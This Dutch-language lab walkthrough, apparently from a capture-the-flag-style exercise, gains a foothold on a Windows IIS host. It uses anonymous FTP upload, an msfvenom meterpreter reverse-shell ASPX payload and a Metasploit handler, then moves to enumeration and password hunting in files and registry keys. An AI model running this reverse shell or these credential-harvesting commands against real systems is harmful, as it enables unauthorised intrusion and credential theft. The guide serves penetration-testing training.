### 🔍 1. Nmap-scan uitvoeren

Scan alle poorten en detecteer services op de doelmachine:

```bash
nmap -A -T4 -p- 10.129.58.159
```

➡️ Dit laat zien dat er een **IIS-webserver draait op poort 80**.

📂 Navigeer in je browser naar:

```
http://10.129.58.159
```

### 📤 2. Test of je bestanden kunt uploaden via FTP

Maak eerst een testbestand:

```bash
echo "This is the universe speaking <3" > enlightment.txt
```

Log in op de FTP-server als anonieme gebruiker:

```bash
ftp 10.129.58.159
Username: anonymous
Password: [druk op enter]
```

Upload je bestand:

```ftp
put enlightment.txt
```

Controleer in de browser of het bestand is geüpload:

```
http://10.129.58.159/enlightment.txt
```

✅ Als je de tekst ziet, betekent dit dat je bestanden kunt uploaden naar de webroot.

### 🛠️ 3. Payload genereren met `msfvenom`

Genereer een reverse shell payload in `.aspx`-formaat:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.13 LPORT=8888 -f aspx -o really-bad-news.aspx
```

### ⚙️ 4. Metasploit-configuratie instellen

Start Metasploit:

```bash
msfconsole
```

Configureer de handler:

```msf
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.13  # jouw lokale IP of tun0
set LPORT 8888
run
```

🟢 De handler luistert nu op poort 8888.

### 🚀 5. Upload je payload naar de FTP-server

Log opnieuw in via FTP en upload de payload:

```bash
ftp 10.129.58.159
Username: anonymous
Password: [enter]
```

```ftp
put really-bad-news.aspx
```

### 🌐 6. Trigger de payload via de browser

Bezoek:

```
http://10.129.58.159/really-bad-news.aspx
```

## System Enumeration

### 🖥️ **Systeeminformatie**

* **Basis systeeminfo:**

  ```cmd
  systeminfo
  ```

* **Meer leesbare versie (alleen OS-naam, versie en systeemtype):**

  ```cmd
  systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
  ```

* **Hostnaam van de machine:**

  ```cmd
  hostname
  ```

### 🔧 **Patches en updates**

* **Geïnstalleerde hotfixes en updates:**

  ```cmd
  wmic qfe get Caption,Description,HotFixID,InstalledOn
  ```

Dit toont een lijst van geïnstalleerde updates, inclusief de naam, beschrijving, HotFixID en installatiedatum.&#x20;

### 💾 **Schijfbeheer**

* **Lijst van alle schijven en hun eigenschappen:**

  ```cmd
  wmic logicaldisk get caption,description,providername
  ```

Dit toont de schijfletter (Caption), beschrijving (Description) en netwerkpad (ProviderName) van elke schijf.

* **Lijst van schijven met extra details:**

  ```cmd
  wmic logicaldisk get caption,description,drivetype,providername,volumename
  ```

Dit geeft aanvullende informatie zoals het type schijf (DriveType) en de volumenaam (VolumeName).

## User Enumeration

### 👤 **Gebruikersinformatie**

* **Huidige ingelogde gebruiker:**

  ```cmd
  whoami
  ```

* **Informatie over de huidige gebruiker (rechten en privileges):**

  ```cmd
  whoami /priv
  ```

* **Groepen waar de huidige gebruiker deel van uitmaakt:**

  ```cmd
  whoami /groups
  ```

* **Lijst van alle gebruikers op het systeem:**

  ```cmd
  net user
  ```

* **Informatie over een specifieke gebruiker:**

  ```cmd
  net user [user]
  ```

* **Informatie over het 'Administrator'-account:**

  ```cmd
  net user administrator
  ```

### 👥 **Groepsinformatie**

* **Lijst van lokale groepen:**

  ```cmd
  net localgroups
  ```

* **Leden van de 'Administrators' groep:**

  ```cmd
  net localgroup administrators
  ```

## Password Hunting

### 🔍 Zoeken naar wachtwoorden in bestanden

Gebruik `findstr` om door bestanden te zoeken naar tekst die het woord "password" bevat.

#### Basiscommando's:

```cmd
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
```

* **/s**: doorzoekt submappen
* **/i**: hoofdletterongevoelig
* **/m**: toont alleen bestandsnamen met matches([Microsoft Learn][1])

Deze commando's zoeken naar het woord "password" in tekst-, XML- en INI-bestanden. Het is mogelijk dat wachtwoorden in deze bestanden zijn opgeslagen in platte tekst.

#### Zoeken naar configuratiebestanden:

```cmd
dir /s *pass* == *cred* == *vnc* == *.config*
```

Dit commando zoekt naar bestanden met namen die mogelijk wachtwoorden bevatten, zoals configuratiebestanden van VNC-servers.

#### Zoeken naar alle bestanden:

```cmd
findstr /spin "password" *.*
```

Dit commando doorzoekt alle bestanden op het systeem naar het woord "password". Let op: dit kan veel resultaten opleveren.

### 🗂️ Specifieke locaties om te controleren

Bepaalde bestanden en mappen zijn bekend om wachtwoorden in platte tekst op te slaan:

* **Unattended installatiebestanden**:([LinkedIn][2])

  * `C:\unattend.xml`
  * `C:\Windows\Panther\Unattend.xml`
  * `C:\Windows\Panther\Unattend\Unattend.xml`
  * `C:\Windows\system32\sysprep.inf`
  * `C:\Windows\system32\sysprep\sysprep.xml`([Penetration Testing Lab][3], [LinkedIn][2])

* **Webconfig-bestanden van IIS**:([NoRed0x][4])

  * `C:\inetpub\wwwroot\web.config`
  * `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`([Penetration Testing Lab][3])

* **Configuratiebestanden van VNC**:

  * `C:\*vnc.ini`
  * `C:\*ultravnc.ini`

Deze bestanden kunnen gevoelige informatie bevatten, zoals wachtwoorden in platte tekst.

### 🧪 Zoeken naar wachtwoorden in het Windows-register

Gebruik `reg query` om te zoeken naar sleutels die mogelijk wachtwoorden bevatten:

* **Algemene zoekopdracht**:

```cmd
  reg query HKLM /f password /t REG_SZ /s
  reg query HKCU /f password /t REG_SZ /s
```

* **Specifieke toepassingen**:

  * **VNC**:

    ```cmd
    reg query "HKCU\Software\ORL\WinVNC3\Password"
    ```

  * **Windows Autologin**:

    ```cmd
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    ```

  * **SNMP**:

    ```cmd
    reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP"
    ```

  * **PuTTY**:

    ```cmd
    reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
    ```

Deze registerlocaties kunnen wachtwoorden bevatten die door verschillende toepassingen worden gebruikt.
